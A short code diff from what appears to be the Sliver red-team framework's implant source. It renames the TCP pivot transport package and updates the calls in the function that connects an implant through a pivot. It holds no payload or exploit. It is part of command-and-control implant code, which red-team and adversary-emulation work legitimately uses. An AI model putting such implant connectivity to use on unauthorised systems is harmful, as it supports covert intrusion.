@@ -56,7 +56,7 @@ import (
 	// {{if .Config.TCPPivotc2Enabled}}
 	"fmt"
 
-	"github.com/bishopfox/sliver/implant/sliver/transports/tcppivot"
+	"github.com/bishopfox/sliver/implant/sliver/transports/pivotclients"
 
 	// {{end}}
 
@@ -628,8 +628,8 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 	log.Printf("Attempting to connect via TCP Pivot to: %s\n", addr)
 	// {{end}}
 
-	opts := tcppivot.ParseTCPPivotOptions(uri)
-	pivot, err := tcppivot.TCPPivotStartSession(uri.Host, opts)
+	opts := pivotclients.ParseTCPPivotOptions(uri)
+	pivot, err := pivotclients.TCPPivotStartSession(uri.Host, opts)
 	if err != nil {
 		return nil, err
 	}
